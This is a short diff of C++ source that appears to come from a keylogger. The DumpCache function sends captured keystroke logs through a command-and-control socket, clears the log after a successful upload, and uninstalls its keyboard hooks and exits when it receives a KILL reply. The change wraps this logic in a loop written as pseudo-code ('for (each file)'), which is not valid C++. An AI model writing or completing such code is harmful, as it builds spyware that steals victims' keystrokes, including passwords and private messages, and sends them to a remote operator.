@@ -59,23 +59,25 @@ void DumpCache()
 		return;	// Files will be left alone
 	}
 
-	// TODO for each file in cache directory
-	RESPONSE_CODE res = ccSocket.sendFile(filename);	
-	if (res == KILL)
+	for (each file)
 	{
-		KeyboardManager::GetInstance().UninstallHooks();
-		// TODO delete all files
-		exit(0);
-	}
-	else if (res == SUCCESS)
-	{
-		KeyboardManager::GetInstance().keylog = "";
-		// TODO delete file
-		IO::WriteAppLog("Successfully sent file");
-	}
-	else
-	{
-		IO::WriteAppLog("Log failed to send");
+		RESPONSE_CODE res = ccSocket.sendFile(filename);	
+		if (res == KILL)
+		{
+			KeyboardManager::GetInstance().UninstallHooks();
+			// TODO delete all files
+			exit(0);
+		}
+		else if (res == SUCCESS)
+		{
+			KeyboardManager::GetInstance().keylog = "";
+			// TODO delete file
+			IO::WriteAppLog("Successfully sent file");
+		}
+		else
+		{
+			IO::WriteAppLog("Log failed to send");
+		}
 	}
 }
 
